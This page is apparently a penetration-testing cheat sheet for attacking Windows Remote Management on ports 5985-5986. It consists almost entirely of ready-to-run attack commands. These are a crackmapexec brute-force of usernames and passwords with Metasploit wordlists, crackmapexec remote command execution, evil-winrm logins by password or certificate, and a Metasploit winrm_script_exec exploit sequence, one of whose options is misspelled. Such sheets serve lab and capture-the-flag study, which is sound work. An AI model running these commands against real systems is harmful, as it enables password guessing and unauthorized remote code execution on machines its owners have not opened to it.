# Port 5985-5986 - WinRM

**WinRM (Windows Remote Management)** is used to manage and configure Windows Systems remotely. WinRM **needed windows credentials**.

```
# CHECK THE VERSION
searchsploit winrm VERSION
```

### CrackMapExec

<pre class="language-bash" data-title="Brute Forcing"><code class="lang-bash"><strong>crackmapexec winrm IP -u /usr/share/metasploit-framework/data/wordlists/common_users.txt -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
</strong></code></pre>

{% code title="Command Execution" %}
```bash
crackmapexec winrm IP -u USER -p PASS -x "whoami"
```
{% endcode %}

### &#x20;evil-winrm

{% code title="User and Password Auth" %}
```bash
evil-winrm -u $USER -p $PASS -i $IP
```
{% endcode %}

{% code title=" .pfx cert and key Auth" %}
```bash
evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
# -i: ip
# -c: public key cert
# -k: private key cert
# -S: enable ssl
```
{% endcode %}



### WinRM Metasploit

```bash
 service postgresql start && msfconsole
 use exploit/windows/winrm/winrm_script_exec
 set RHOSTS IP
 set RPORT PORT
 set FORCE_VBS true
 set USERNAME USER
 set PASSOWRD PASS
 exploit
```
